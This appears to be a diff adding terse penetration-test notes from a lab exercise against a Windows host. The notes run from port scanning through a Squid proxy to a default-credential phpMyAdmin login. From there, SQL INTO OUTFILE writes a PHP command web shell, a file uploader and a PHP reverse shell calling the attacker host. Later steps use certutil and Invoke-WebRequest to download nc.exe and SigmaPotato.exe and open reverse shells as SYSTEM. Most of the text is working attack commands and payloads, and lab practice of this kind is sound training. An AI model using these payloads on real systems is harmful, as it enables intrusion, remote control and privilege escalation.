@@ -1,0 +1,72 @@
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3128/tcp  open  http-proxy    Squid http proxy 4.14
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/4.14
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-04-22T06:27:30
+|_  start_date: N/A
+
+python3 spose.py --proxy http://192.168.232.189:3128 --target 192.168.232.189
+Scanning default common ports
+Using proxy address http://192.168.232.189:3128
+192.168.232.189:3306 seems OPEN
+192.168.232.189:8080 seems OPEN
+
+
+Use FoxyProxy
+browser in 192.168.232.189:8080
+go to phpmyadmin
+use default credential root:'' to get in
+
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/test.php' 
+inject a webshell in mysql.
+
+$ curl --proxy http://192.168.232.189:3128 "http://192.168.232.189:8080/test.php?cmd=whoami"  
+nt authority\local service
+
+Set up a reverse shell, it connected and drop immediately.
+SELECT '<?php $sock=fsockopen("192.168.45.201",4444);$proc=proc_open("cmd.exe", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' INTO OUTFILE 'C:/wamp/www/cmd.php' 
+http://192.168.232.189:8080/cmd.php
+$ rlwrap nc -nlvp 4444               
+listening on [any] 4444 ...
+connect to [192.168.45.201] from (UNKNOWN) [192.168.232.189] 50076
+
+use windows-compatible nc.exe
+$ cp /usr/share/windows-resources/binaries/nc.exe ~/offseclabs
+
+http://192.168.232.189:8080/test.php?cmd=certutil -urlcache -f <http://192.168.45.201/nc.exe> C:\\wamp\\www\\nc.exe
+
+http://192.168.232.189:8080/test.php?cmd=C:\\wamp\\www\\nc.exe -e cmd.exe 192.168.45.201 4444
+
+https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+upload shell.php
+and get a reverse shell
+PS C:\Users> whoami /priv
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+upload potato and re-upload nc.exe as the first time upload fail.
+iwr -uri http://192.168.45.201/SigmaPotato.exe -OutFile SigmaPotato.exe
+PS C:\temp> certutil.exe -urlcache -split -f http://192.168.45.201/nc.exe
+PS C:\temp> .\SigmaPotato.exe "C:\temp\nc.exe -e cmd.exe 192.168.45.201 443"
+
+
+
+
+
+
+
+
+
